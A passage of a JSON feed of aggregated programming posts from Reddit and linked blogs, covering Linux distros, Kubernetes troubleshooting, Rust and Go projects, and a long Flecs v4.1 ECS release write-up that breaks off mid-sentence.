things ) so i went to manjaro and yeah i really liked it ( i am biased as it is the one i used many years ago ) it had customization and i didnt find many bugs and i really liked it but then got on reddit and saw everyone hates it and saying endeavour is better and the manjaro team is poopy so i will give it a try starting today ( my favorite one was arch but i found myself breaking it every other day and reinstalling it again and i don't have much time for it, i 100% prefer arch based distros and maybe one day i'll go full arch if i find the time ( or not, depends how endeavour goes )</p>","contentLength":1057,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Fedora: Proposal for the removal of i686 withdrawn","url":"https://discussion.fedoraproject.org/t/f44-change-proposal-drop-i686-support-system-wide/156324/400","date":1751270726,"author":"/u/FryBoyter","guid":176428,"unread":true,"content":"<!DOCTYPE html>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/linux/comments/1lo1w8e/fedora_proposal_for_the_removal_of_i686_withdrawn/"},{"title":"Freelens v1.4.0 is just released","url":"https://github.com/freelensapp/freelens/releases/tag/v1.4.0","date":1751268564,"author":"/u/dex4er","guid":176392,"unread":true,"content":"<p>I'm happy to share with you the newest release of free UI for Kubernetes with a lot of minor improvements for UX and handling extensions. This version also brings full support for Jobs, CronJobs, and EndpointSlices. </p><p>Extensions can now use the JSX runtime and many more React components. The new version is more developer-friendly, and I hope we'll see some exciting extensions soon.</p><p>Finally Windows arm64 version is bug-free and can install extensions at all. Of course, all other versions are first citizens too: Windows x64 (exe, msi, and WinGet), MacOS arm64 and Intel (pkg, dmg, and brew), Linux for all variants (APT, deb, rpm, AppImage, Flatpak, Snap, and AUR).</p>","contentLength":666,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/kubernetes/comments/1lo1dgs/freelens_v140_is_just_released/"},{"title":"Service Binding for K8s in Spring Boot cloud-native applications","url":"https://medium.com/cloudnativepub/service-binding-for-k8s-in-spring-boot-cloud-native-applications-3717d3486886?sk=346dc534327888ca805aad94e5d0f1b5","date":1751266991,"author":"/u/zarinfam","guid":176358,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/kubernetes/comments/1lo0zg3/service_binding_for_k8s_in_spring_boot/"},{"title":"Donate More by Donating Less","url":"https://www.reddit.com/r/linux/comments/1lo0x5p/donate_more_by_donating_less/","date":1751266754,"author":"/u/Fluid-Pirate646","guid":176359,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"What is the Rusty Approach to Distributed Systems?","url":"https://www.reddit.com/r/rust/comments/1lo0dr4/what_is_the_rusty_approach_to_distributed_systems/","date":1751264610,"author":"/u/skwyckl","guid":176815,"unread":true,"content":"<p>I have thickened my skin in the Erlang / Elixir world when starting out, which kind of ruined concurrency for me in all other languages, but still, I am building an application in Rust and was thinking how to replicate the features that make Erlang-style concurrency so great. So, for starting out, the Actor Model can be implemented using e.g. Actix, so all good, but AFAIK I can't have two Actix actors communicate across difference instances of my application. What link is missing there Rust-wise? Thank you in advance.</p>","contentLength":523,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"[Kubernetes] Backend pod crashes with Completed / CrashLoopBackOff, frontend stabilizes — what’s going on?","url":"https://www.reddit.com/r/kubernetes/comments/1lo0168/kubernetes_backend_pod_crashes_with_completed/","date":1751263268,"author":"/u/erudes91","guid":176321,"unread":true,"content":"<p>New to building K clusters, only been a user of them not admin.</p><ul><li>Running local K8s cluster with 2 nodes (node1: control plane, node2: worker).</li><li>Built and deployed a full app manually (no Helm).</li><li>Backend: Python Flask app (alternatively tested with Node.js).</li><li>Frontend: static HTML + JS on Nginx.</li><li>Services set up properly ( for backend,  for frontend).</li></ul><ul><li>Backend pod status starts as , then goes to , and finally ends up in .</li><li> for backend shows nothing.</li><li>Flask version works  when run with Podman on node2: it starts, listens, and responds to POSTs.</li><li>Frontend pod goes through multiple restarts, but after a few minutes finally stabilizes ().</li><li>Frontend can't reach the backend () — because backend isn’t running.</li></ul><ul><li>Verified backend image runs fine with <code>podman run -p 5000:5000 backend:local</code>.</li><li>Described pods: backend shows , , no crash trace.</li><li>Checked YAML: nothing fancy — single container, exposing correct ports, no health checks.</li><li>Logs: totally empty (), no Python traceback or indication of forced exit.</li><li>Frontend works but obviously can’t POST since backend is unavailable.</li></ul><ul><li>The pod exits cleanly after handling the POST and terminates.</li><li>Kubernetes thinks it crashed because it exits too early.</li></ul><p><strong>node1@node1:/tmp$ kubectl get pods</strong></p><p>NAME READY STATUS RESTARTS AGE</p><p>backend-6cc887f6d-n426h 0/1 CrashLoopBackOff 4 (83s ago) 2m47s</p><p>frontend-584fff66db-rwgb7 1/1 Running 12 (2m10s ago) 62m</p><p>Why does this pod \"exit cleanly\" and not stay alive?</p><p>Why does it behave correctly in Podman but fail in K8s?</p><p>Any files you wanna take a look at?</p><pre><code>FROM node:18-slim WORKDIR /app COPY package*.json ./ RUN npm install COPY server.js ./ EXPOSE 5000 CMD [\"node\", \"server.js\"] FROM node:18-slim WORKDIR /app COPY package*.json ./ RUN npm install COPY server.js ./ EXPOSE 5000 CMD [\"node\", \"server.js\"] </code></pre><pre><code>const express = require('express'); const app = express(); app.use(express.json()); app.post('/register', (req, res) =&gt; { const { name, email } = req.body; console.log(`Received: name=${name}, email=${email}`); res.status(201).json({ message: 'User registered successfully' }); }); app.listen(5000, () =&gt; { console.log('Server is running on port 5000'); }); const express = require('express'); const app = express(); app.use(express.json()); app.post('/register', (req, res) =&gt; { const { name, email } = req.body; console.log(`Received: name=${name}, email=${email}`); res.status(201).json({ message: 'User registered successfully' }); }); app.listen(5000, () =&gt; { console.log('Server is running on port 5000'); }); </code></pre>","contentLength":2463,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"We are rewriting the message queue in Rust and would like to hear your suggestions.","url":"https://www.reddit.com/r/rust/comments/1lnzkjq/we_are_rewriting_the_message_queue_in_rust_and/","date":1751261497,"author":"/u/wenqiang_lobo","guid":176473,"unread":true,"content":"<p>We are a group of developers who love Rust, message queues, and distributed storage. We are trying to write a message queue using Rust. Its name is: RobustMQ. It follows the Apache-2.0 license. We hope that it can eventually be contributed to the Apache community and become a top project of the Apache community, contributing our own share of strength to the Apache and Rust communities. </p><p>Some information about RobustMQ: </p><ol><li>Original intention: To explore the possibility of combining Rust with message queues, and solve the existing problems of the message queue components in the current community.</li><li>Positioning: An All In One open-source message queue developed 100% based on the Rust language.</li><li>Goal: To deliver a message queue that supports multiple mainstream messaging protocols, has a completely Serverless architecture, is low-cost, and elastic.</li></ol><ul><li>100% Rust: A message queue engine implemented entirely based on the Rust language.</li><li>Multiple protocols: Supports MQTT 3.1/3.1.1/5.0, AMQP, Kafka Protocol, RocketMQ Remoting/GRPC, OpenMessing, JNS, SQS, etc., the mainstream messaging protocols.</li><li>Hierarchical architecture: A three-layer architecture with completely independent computing, storage, and scheduling, with clear responsibilities and independence.</li><li>Serverless: All components have distributed cluster deployment capabilities and the ability to quickly scale up and down.</li><li>Plugin-based storage: An independent plugin-based storage layer implementation, supporting both independent deployment and shared storage architectures.</li><li>Comprehensive functions: Fully aligns with the functions and capabilities of the mainstream MQ products in the corresponding communities. </li></ul><p>For more detailed information, please visit our Github homepage and official website: </p><p>We have currently completed the development of the first release version, including the overall architecture and the adaptation of the MQTT protocol. Next, we plan to further improve the MQTT, refine the stability, and then prepare for compatibility with the Kafka protocol. </p><p>At this stage, we would like to hear your suggestions. We hope to know whether this action makes sense and what areas for improvement there are. So that we can stay on the right track and do this well. </p><p>We know this is a difficult task, but we think it's a really cool thing and we want to give it a try. We are looking forward to the community's suggestions. </p><p>Cool! Let's do something fun together~. </p><p>At the same time, we also hope to find students who are interested in implementing infrastructure components, message queues, and distributed storage systems using Rust, and together explore the unlimited possibilities of Rust in the field of infrastructure. </p>","contentLength":2681,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Zoi: A Universal Package Manager (Seeking Contributors!)","url":"https://www.reddit.com/r/golang/comments/1lnzfp3/zoi_a_universal_package_manager_seeking/","date":1751260987,"author":"/u/ZilloweZ","guid":176474,"unread":true,"content":"<p>Zoi is a project I recently started working on, its main goal is to provide a universal package manager for all operating systems and architectures. It's currently in beta, and it's has a lot of problems, please don't hesitate to report an issue.</p><p>It fetches the packages from a git repo and sync it locally, the packages are in yaml format. The yaml file has options to download the file, either a binary, installer script or build from source. Also it has runtime dependencies and build dependencies.</p><p>I'm currently looking for contributors, idk if this post is correct sharing it here, I hope so.</p>","contentLength":595,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Feadback/Support: Inkube CLI app - Helps to Develop Inside Kubernetes Environment","url":"https://www.reddit.com/r/kubernetes/comments/1lnzazc/feadbacksupport_inkube_cli_app_helps_to_develop/","date":1751260519,"author":"/u/abdheshnayak","guid":176320,"unread":true,"content":"<p>I felt hectic to setup and manage local development with kubernetes cluster access. i was thinking solution for easy setup for each project with added env mirroring and packages locking. so built one tools for it inkube which helps to connect with cluster, mirror env and also provides package manager.</p><p>please have a look and leave your thoughts and feed back on it.</p>","contentLength":365,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Go makes sense in air-gapped ops environments","url":"https://www.reddit.com/r/golang/comments/1lnz0w2/go_makes_sense_in_airgapped_ops_environments/","date":1751259520,"author":"/u/Resource_account","guid":176323,"unread":true,"content":"<p>Been doing Linux ops in air-gapped environments for about a year. Mostly RHEL systems with lots of automation. My workflow is basically 75% bash and 25% Ansible.</p><p>Bash has been solid for most of my scripting needs. My mentor believes Python scripts are more resilient than bash and I agree with him in theory but for most file operations the extra verbosity isn't worth it.</p><p>So far I've only used Python in prod in like 2-3 situations. First I wrote an inventory script for Ansible right around the time I introduced the framework itself to our shop. Later I wrote a simple script that sends email reminders to replace certain keys we have. Last thing I built with it was a PyGObject GUI though funny story there. Took a week to build in Python then rewrote it in bash with YAD in an afternoon.</p><p>Python's stdlib is honestly impressive and covers most of what I need without external dependencies. But we've got version management headaches. Desktops run 3.12 for Ansible but servers are locked to 3.8 due to factory requirements. System still depends on 3.6 and most of the RPM's are built against 3.6 (RHEL 8).</p><p>Started exploring Go recently for a specific use case. Performance-critical stuff with our StorNext CVFS. In my case with venv and dependencies on CVFS performance has been a little rough. The compiled binary approach seems ideal for this. Just rsync the binary to the server and it runs. Done.</p><p>The other benefit I've noticed is the compiler feedback. Getting LSPs and linters through security approval is a long exhausting process so having the compiler catch issues upfront, and so quickly, helps a lot. Especially when dealing with the constant firefighting.</p><p>Not saying Python is bad or Go is better. Just finding Go fits this particular niche really well.</p><p>Wondering if other devops or linux sysadmins have found themselves in a similar spot.</p>","contentLength":1847,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Procedural city generation in go with ebitengine","url":"https://hopfenherrscher.itch.io/union-station","date":1751258433,"author":"/u/oliver-bestmann","guid":176293,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/golang/comments/1lnypwm/procedural_city_generation_in_go_with_ebitengine/"},{"title":"Would love some feedback on a library I’m writing!","url":"https://www.reddit.com/r/golang/comments/1lnyfjq/would_love_some_feedback_on_a_library_im_writing/","date":1751257417,"author":"/u/Far_Solution_1784","guid":176394,"unread":true,"content":"<p>Hello, I am working on a library that wraps go docker sdk and also wraps over the docker compose cli to allow you to programmatically create docker compose files and or run directly from go code. I’m aiming to solve a solution for go devs that want programmatic control over docker in a declarative fashion. </p><p>Would love some feedback, or if you’re willing to contribute that would be sick! </p>","contentLength":393,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Should I be Looking into Custom Metrics or External Metrics?","url":"https://www.reddit.com/r/kubernetes/comments/1lnydqd/should_i_be_looking_into_custom_metrics_or/","date":1751257242,"author":"/u/zangetsuMG","guid":176291,"unread":true,"content":"<p>I am not completely sure if I am even asking the right kind of questions, so please feel free to offer guidance. I am hoping to learn how I can use either Custom Metrics or External Metrics to solve some problems. I'll put the questions up front, but also provide some background that might help people understand what I am thinking and trying to do.</p><p>Thank you and all advice is welcome.</p><p><strong>Is there some off the shelf solution that can run an SQL Query, and provide the result as a metric?</strong></p><p>This feels like it is a problem others have had and is probably already solved. I feel like there should be some kind of existing service I can run, and with appropriate configuration it should be able to connect to my database, run a query and return that value as a metric in a form that K8s can use. Is there something like that?</p><p><strong>If I have to implement my own, Should I be looking at Custom Metrics or External Metrics?</strong></p><p>I can go down the path of building my own metrics service, but if I do, should I be doing Custom Metrics, or External Metrics? Is there some documentation about Custom Metrics or External Metrics that is more than just a generated description of the data types? I would love to find something that explains things like what the different parts of the URI path mean, and all the little pieces of the data types so that if I do implement something, I can do it right.</p><p><strong>Is it really still a beta API after at least 4 years?</strong></p><p>I'm kind of surprised by the v1beta1 and v1beta2 in the names after all this time.</p><p> (feel free to stop reading here)</p><p>I am working with a system that is composed of various containers. Some containers have a web service inside of them, while others have a non-interactive processing service inside them, and both types communicate with a database (Microsoft SQL Server). </p><p>The web servers are actually Asp.Net Core web servers and we have been able to implement a basic web API that returns an HTTP 200 OK if the web server thinks it is running correctly, or an HTTP error code if it is not. We've been able to configure K8s to probe this API and do things like terminate and restart the container. For the web servers we've been able to setup some basic horizontal auto-scaling based on CPU usage. (If they have high sustained CPU usage, scale up).</p><p>For our non-interactive services (Also .Net code), they mostly connect to the database periodically and do some work (this is way over-simplified, but I suspect the details aren't important.)In the past we have had some cases where these processes may get into a broken state, but from the container management tools they look like they are running just fine. This is one problem I would like to be able to detect and have k8's report and maybe fix. Another issue is that I would like for these non-interactive services to be able to auto-scale, but the catch here is that the out of the box metrics like CPU and Memory aren't actually a good indicator if the container should be scaled.</p><p>I'm not too worried about the web servers, but I am worried about the non-interactive services. I am reasonably sure I could add a very small web API that could be probed, and that we could configure K8s to check the container and terminate and restart. In fact I am almost sure that we'll be adding that functionality in the near future.</p><p>I think for our non-interactive services in order to get a smart horizontal auto-scaling, we need some kind of metrics server, but I am having trouble determining what that metrics service should look like. I have found the external metrics documentation at <a href=\"https://kubernetes.io/docs/reference/external-api/\">https://kubernetes.io/docs/reference/external-api/</a> but I find it a bit hard to follow.</p><p>Because of the way my non-interactive services work, I am thinking that there is some amount of available work in our database. The unit-of-work has a time value for when the unit of work was added, so I should be able to look at the work, and calculate how long the work has been waiting before being processed, and if that time span is too long, that would be the signal to scale up. I am reasonably sure I could distill that question down to an SQL query that returns a single number, that could be returned as a metric.</p>","contentLength":4160,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Building a PC for AI Workloads + Kubernetes, Need Advice on CPU, GPU, RAM & Upgradability","url":"https://www.reddit.com/r/kubernetes/comments/1lny37h/building_a_pc_for_ai_workloads_kubernetes_need/","date":1751256230,"author":"/u/root0ps","guid":176290,"unread":true,"content":"<p>I’m planning to build a PC mainly to learn and run AI workloads and also set up Kubernetes clusters locally. I already have some experience with Kubernetes and now want to get into training and running AI models on it.</p><p>I’m based in India, so availability and pricing of parts here is also something I’ll need to consider.</p><p>I need help with a few things:</p><p>CPU – AMD or Intel? I want something powerful but also future-proof. I’d like to upgrade the CPU in the future, so I’m looking for a motherboard that will support newer processors.</p><p>GPU – NVIDIA or AMD? My main goal is running AI workloads. Gaming is a secondary need. I’ve heard NVIDIA is better for AI (CUDA, etc.), but is AMD also good enough? Also, is it okay to start with integrated graphics for now and add a good GPU 6–8 months later? Has anyone tried this?</p><p>RAM – 32 GB or 64 GB? Is 32 GB enough for running AI stuff and Kubernetes? Or should I go for 64 GB from the start?</p><p>Budget: I don’t have a strict budget, but I’m thinking around $2000. I’m okay with spending a bit more if it means better long-term use.</p><p>I want to build something I can upgrade later instead of replacing everything. If anyone has built a PC for similar use cases or has suggestions, I’d really appreciate your input!</p>","contentLength":1271,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Donate More by Donating Less (further explanation from Steve Deobald)","url":"https://www.reddit.com/r/linux/comments/1lnxslo/donate_more_by_donating_less_further_explanation/","date":1751255241,"author":"/u/pr0fic1ency","guid":176275,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"[R] Free access to an H100. What can I build?","url":"https://www.reddit.com/r/MachineLearning/comments/1lnvjin/r_free_access_to_an_h100_what_can_i_build/","date":1751247987,"author":"/u/cringevampire","guid":176655,"unread":true,"content":"<p>My company is experimenting with new hardware and long story short, there's an idling H100 with a 2TB RAM and 27TB of storage and I'm allowed to play with it!</p><p>I really want to do some cool AI research to publish at a decent conference but I'm not well caught up with the research frontier and I could really use some help (and collaborators?).</p><p>I understand neural networks, CNNs, transformer models etc. to a reasonable depth but understanding what SOTA is will probably take more time than how long I have access to the GPU</p>","contentLength":522,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Duke Nukem 3D code review by Tariq10x","url":"https://m.youtube.com/watch?v=F9lOJlC_kQs","date":1751242022,"author":"/u/r_retrohacking_mod2","guid":175519,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1lntlhj/duke_nukem_3d_code_review_by_tariq10x/"},{"title":"Flecs v4.1, an Entity Component System for C/C++/C#/Rust is out!","url":"https://ajmmertens.medium.com/flecs-4-1-is-out-fab4f32e36f6","date":1751241621,"author":"/u/ajmmertens","guid":176292,"unread":true,"content":"<p><a href=\"https://github.com/SanderMertens/flecs\" rel=\"noopener ugc nofollow\" target=\"_blank\">Flecs</a> is an Entity Component System (<a href=\"https://github.com/SanderMertens/ecs-faq\" rel=\"noopener ugc nofollow\" target=\"_blank\">FAQ</a>) for C and C++ that helps with building games, simulations and more. The core features of Flecs are:</p><ul><li>Store data for  in data structures optimized for CPU cache efficiency and composition-first design</li><li>Builtin support for hierarchies, prefabs and more with <a href=\"https://www.flecs.dev/flecs/md_docs_2Relationships.html\" rel=\"noopener ugc nofollow\" target=\"_blank\"></a>which speed up game code and reduce boiler plate</li><li>An <a href=\"https://www.flecs.dev/explorer\" rel=\"noopener ugc nofollow\" target=\"_blank\"></a><a href=\"https://www.flecs.dev/flecs/md_docs_2Quickstart.html#addons]\" rel=\"noopener ugc nofollow\" target=\"_blank\"></a>to profile, visualize, document and debug projects</li></ul><p>Flecs is fully open source and licensed under the MIT license. If you’d like to support the project, consider giving it a ️️⭐️ on the Github page!</p><p>Since v4.0 there have been exciting updates from games that use Flecs!</p><p>Congrats to the Tempest Rising team on the successful release of their game! Command distinct factions in a desperate struggle for power and resources in Tempest Rising — a classic RTS set on Earth after a nuclear war (Unreal Engine 5).</p><h2>Announced: Resistance is Brutal</h2><p>Resistance is Brutal is Vampire Survivors meets Running Man with a bit of Rick and Morty thrown in. Try to survive as you battle the enemy hordes with brutal abilities before going out in a blaze of glory (Unreal Engine 5).</p><h2>Announced: Age of Respair</h2><p>Age of Respair is a medieval strategy castle-builder. Build massive castles with fortifications while managing resources and production chains. Assemble a large army and lay siege to enemy castles. Lead your people and bring respair to your kingdom (Unreal Engine 5).</p><p>You’ve been hired by an elite organization that cooks for gods. Farm, automate, and cook gourmet meals to appease divine beings or face extinction (Unreal Engine 5).</p><p>Ascendant is a large scale open world voxel RPG inspired by Minecraft and Daggerfall. it spawns the player into a procedurally generated landscape with various biomes and features such as cities and ruins. It creates animals and enemies in the map, and you can gather resources, craft them into other ones, and fight enemies with sword, bow, or magic.</p><p>The developer behind this project is also the author of <a href=\"https://vkguide.dev/\" rel=\"noopener ugc nofollow\" target=\"_blank\">vkguide</a>, which is one of the best resources for learning Vulkan. There is a <a href=\"https://vkguide.dev/docs/ascendant\" rel=\"noopener ugc nofollow\" target=\"_blank\">chapter</a> dedicated specifically to Ascendant, make sure to check it out!</p><p>A vampire survivor like game built in Flecs. What’s awesome is that the developer of the game has made its source code available! Check it out here: <a href=\"https://github.com/ptidejteam/ecs-survivors\" rel=\"noopener ugc nofollow\" target=\"_blank\">https://github.com/ptidejteam/ecs-survivors</a></p><p>There are still more projects cooking that I haven’t listed here. If you want to stay up to date on the progress of Flecs projects, check out the <a href=\"https://discord.com/invite/caR2WmY\" rel=\"noopener ugc nofollow\" target=\"_blank\">showcase channel</a> of the Flecs Discord!</p><p>The v4.1 release builds on the new architecture laid out by v4.0 and comes with significant performance improvements across many parts of the library, in addition to new features that are already proving popular with developers.</p><p>Here are some of the most notable performance improvements (as measured by the <a href=\"https://github.com/SanderMertens/ecs_benchmark\" rel=\"noopener ugc nofollow\" target=\"_blank\">Flecs benchmarking suite</a>):</p><ul><li>: 5x faster than v4.0</li><li>: 5x faster than v4.0</li><li>: 5–10x faster than v4.0</li><li>: 1.5–2x faster than v4.0</li><li>: 2–4x faster than v4.0</li><li>: 5–10x faster than v4.0</li><li>: 40x faster than v4.0, 6x faster than v3.2.12</li></ul><p>Flecs now also uses a lot less memory. The minimum footprint of a Flecs world has decreased 5x, and overall RAM consumption can be as much as two times lower depending on the application! Scroll down to the “Performance” section to see how these improvements were achieved.</p><p>As with every release, a lot of effort has gone into testing and bugfixing. Flecs now has 11.000 test cases, an increase of 2500 test cases since v4.0!</p><p>Here’s an overview of the highlights since v4.0:</p><h2>Non-fragmenting components</h2><p>Flecs is an <a rel=\"noopener\" href=\"https://ajmmertens.medium.com/building-an-ecs-2-archetypes-and-vectorization-fe21690805f9\" data-discover=\"true\">archetype-style ECS</a>, which in short means it optimizes the storage at runtime to allow for fast iteration of multiple components at the same time. The tradeoff that comes with this design however is that adding and removing components to entities can be expensive.</p><p>The alternative to archetypes is a sparse set or independent-storage based design. This design has the opposite tradeoff: adding/removing components is cheap, but iterating multiple components at the same time is more expensive.</p><p>Flecs v4.1 is the first* open source ECS that <a href=\"https://www.flecs.dev/flecs/md_docs_2ComponentTraits.html#dontfragment-trait\" rel=\"noopener ugc nofollow\" target=\"_blank\">supports both</a>! Switching between storages is easy, just add the  trait to a component during registration:</p><pre></pre><p><em>* many people have pointed out to me that Bevy ECS has had sparse components for a long time. That’s correct, but adding a sparse component to an entity in Bevy changes its archetype, so they are *not* non-fragmenting!</em></p><h2>Flecs Script improvements</h2><p>Many new features and performance improvements have been added to Flecs Script that allow for the creation of more complex scenes. Here’s an overview of the most notable changes:</p><ul><li>A new (much faster) expression parser</li><li>A new  addon</li><li>Entity name expressions ()</li></ul><p>An example script that uses some of the new features:</p><pre></pre><p>The following scene is constructed entirely from primitive rectangle and box shapes (link to the code below the image):</p><p>Often when working with hierarchies the order in which children are processed is important. This is especially true for UIs, where the order of widgets can determine how they appear on screen.</p><p>Because of how the Flecs storage works internally, the order in which children are iterated can change when components are added or removed. To improve the usability of builtin hierarchies when working with UIs and similar use cases, a new  trait has been introduced:</p><pre></pre><p>An additional operation has been introduced that makes it possible to change the order of children after they have been created:</p><pre></pre><h2>World local component ids</h2><p>A common annoyance when working with multiple Flecs worlds was that if components were shared between worlds, their ids had to match. This could sometimes lead to unexpected and confusing errors, and was not great for developer UX.</p><p>Since v4.0.4 component ids in the C++ API are now fully local to a world, which means that different worlds can have different ids for the same component.</p><h2>get()/try_get() API redesign</h2><p>The C++  APIs have been redesigned to use the following pattern:</p><pre></pre><p>This expresses intent more clearly and can reduce boilerplate as code no longer has to include defensive checks on whether  returns a . It also allows most code to work with references, which many users prefer.</p><p>: this is a breaking change that affects a lot of code. An easy way to migrate is to replace all occurrences of  in a project with .</p><p>A new  API has been added to the C++ API which can be used as an alternative to . The  operation will add a component to an entity if the entity didn’t have it yet, whereas  only assigns existing components and will panic if the entity didn’t have the component yet.</p><p>In addition to expressing intent more clearly,  also guarantees that it will never move entities to different archetypes, which is something that can happen when calling .</p><p>Using  can also significantly improve performance. This is partly because the operation to get an existing component is faster than the operation to ensure that a component exists.</p><p>A larger improvement comes from another optimization, which is that Flecs no longer inserts  commands if there are no  hooks/observers. In applications that use  frequently this can make a huge difference: it cut frame times in half in one of the Flecs demos.</p><p>Some games can have large variations in the number of objects they are simulating. Flecs holds on to memory once it’s been allocated to avoid constantly freeing and reallocating memory. This can however cause a game to use a lot more memory than what is required for the number of objects in a scene.</p><p>Usually this is not a problem. When someone is playing a game it is typically the only thing that’s happening on a machine, so as long we don’t exceed the maximum amount of RAM the ECS is allowed to use we’re good.</p><p>But what if the game is  the only thing that’s running on the machine? Maybe the process is a game server that coexists with other processes on a server. Maybe the application launches other processes, and needs to run in the background until those other processes finish.</p><p>For those scenarios where the simulation still needs to run but with a greatly reduced number of entities, applications can now shrink the world:</p><p>This frees memory where possible by reclaiming memory from arrays, cleaning up unused tables and more.</p><p>In multithreaded applications it can be difficult to know when the ECS world can be accessed safely, especially if you have a large team of developers. A new feature has been added to help track down scenarios where more than one thread is trying to (illegally) access the world:</p><pre></pre><p>When a thread is done it can release the world so others can use it again:</p><pre></pre><p>When releasing the world a thread can choose to lock it for writing. This only allows threads to read the world, and effectively allows threads to write to a world only when they have exclusive access:</p><pre></pre><h2>Performance tracing hooks</h2><p>Flecs now provides hooks for better integration with profiling tools such as <a href=\"https://github.com/wolfpld/tracy\" rel=\"noopener ugc nofollow\" target=\"_blank\">Tracy</a>. This provides fine-grained visibility in how much time different parts of Flecs applications such as observers and systems are performing.</p><p>The new hooks can be set as callbacks on the OS API:</p><pre></pre><p>There is now <a href=\"https://github.com/flecs-hub/traffic\" rel=\"noopener ugc nofollow\" target=\"_blank\">a new Flecs demo</a> that showcases large numbers of objects with complex behavior. The demo is still a work in progress but it‘s already pretty satisfying to look at:</p><p>This project proved to be as much of an exercise in designing ECS components for optimal CPU cache efficiency, as well as coming up with a set of behaviors that keep traffic flowing at all times. I might do a writeup at some point as there’s fun takeaways from both.</p><p>Because such a large part of this release was dedicated to performance improvements, I thought it’d be fun to share a few details on what changed. This will be more technical than these blogs usually are, so if you’re not interested in nitty-gritty details you can safely skip this.</p><p>In “<a rel=\"noopener\" href=\"https://ajmmertens.medium.com/building-an-ecs-1-where-are-my-entities-and-components-63d07c7da742\" data-discover=\"true\">where are my entities and components</a>” I talked about how we can find components on entities using the component index. This allows us to do operations like , which are common and thus performance critical:</p><pre></pre><p>The component index provides us with a general purpose, constant time solution for finding components. In short, it works like this:</p><pre></pre><p>This approach has a big downside: it needs to access at least three distinct memory locations which can easily cause CPU cache misses.</p><p>Flecs v4.0.1 introduced a component lookup array to each table which provides a much more direct path to obtain the component column:</p><pre></pre><p>The size of  is bound to 256 by default to avoid spending too much memory, so if component ids are larger than that we still revert to the old method of going through the component index.</p><p>This simple change sped up  and related operations by 3x!</p><p>Uncached queries use the component index to quickly find all tables that have the components in a query. In v4.1.0 a new bloom filter got introduced that significantly speeds up uncached query evaluation.</p><p>The existing approach uses the component index to match tables. For a  query, the query engine does the following:</p><pre></pre><p>Map lookups are fast enough for many use cases, but they start adding up when they’re done millions of times per second.</p><p>The new bloom filter avoids having to do many of these lookups. A bloom filter is a bit pattern that can tell us one of two things:</p><ul><li>this table  matches the query</li><li>this table  match the query</li></ul><p>Evaluating the bloom filter looks like this and is super fast:</p><pre></pre><p>We can’t use the bloom filter for all queries, as we can’t express things like operators or more advanced query features. Where it can be used though speedups are significant: observer evaluation got faster because the bloom filter in many cases prevented observer query evaluation entirely!</p><h2>Faster flecs::ref validation</h2><p>The  API provides an even faster way to get a component pointer than . It does this by storing a bit of state about the component so that the next time it is fetched we have to do less work. An example:</p><pre></pre><p>Previously this worked by caching the table record (see “faster component lookups”) on the . This was faster than a , but it does require accessing the table record which could cause cache misses.</p><p>A colleague came up with a clever way to prevent having to do this, and speed up the implementation of  by 2x:</p><ul><li>A ref now directly stores a pointer to the component</li><li>It also stores a “table version”</li><li>Whenever something happens that invalidates a component pointer we increase the table version, which is stored in an array in the world:</li></ul><pre></pre><ul><li>When fetching the component, we check the table version in the ref with the table version in the array:</li></ul><pre></pre><p>Note how we’re only accessing the  and  here. Because the latter is likely to be hot in the cache, we avoid the vast majority of cache misses, which greatly speeds up  performance!</p><p>Fun fact:  is now as fast as  was before this optimization!</p><h2>Faster component fetching when iterating cached queries</h2><p>A major factor that determines how fast queries evaluate is how quickly we can fetch the iterated components. Flecs has gone through a number of iterations that progressively sped this up.</p><p>Flecs v4.1 introduces a new change that significantly speeds this up for cached queries, with a mechanism that is very similar to the new mechanism used by !</p><p>In short, the query now caches component pointers for each matched table. If a cached query matches , then for each matched table the cache entry will store a pointer to the  column and to the  column.</p><p>Column pointers can become invalid however if a column is resized. To address this each cache entry stores a table version (just like ) that increases when column pointers change. We then do the exact same thing we did for references to make sure the pointers are still valid before returning them to the application.</p><p>This is super efficient because:</p><ul><li>Table columns rarely grow, so we almost never need to revalidate the cached column pointers.</li><li>Table columns always grow together, which means we can use a single version number to check all columns.</li></ul><p>This change by itself can speed up cached query iteration by 2x, but it’s not the only thing that changed for cached queries:</p><p>Flecs cached queries are packed with features, and over time these increased the size of the cache elements. Things like wildcards, relationship traversal, grouping and sorting all added fields to cache elements. Most queries don’t use these features however, and so these fields just add dead weight to cache elements.</p><p>Another source of inefficiency is that the query cache was based on a linked list. Iterating the query cache meant doing this (pseudo):</p><pre></pre><p>The nice thing about this was that the iteration code could remain entirely agnostic to query features such as grouping and sorting, which just rewired the  pointers of query cache elements.</p><p>Sadly linked lists come with significant performance drawbacks. Combined with a less than optimal allocation strategy for cache elements, iterating this linked list all but guaranteed tons of cache misses.</p><p>Flecs v4.1 completely refactored the query cache to address these issues:</p><ul><li>Queries now use much (3x) smaller cache elements for simple queries</li><li>The linked list has been replaced with an array</li></ul><p>Combined these changes added up to another 2x performance improvement, and a big reduction in query cache size! These improvements also enabled me to write a much simpler iterator function which also accounted for a large part of the 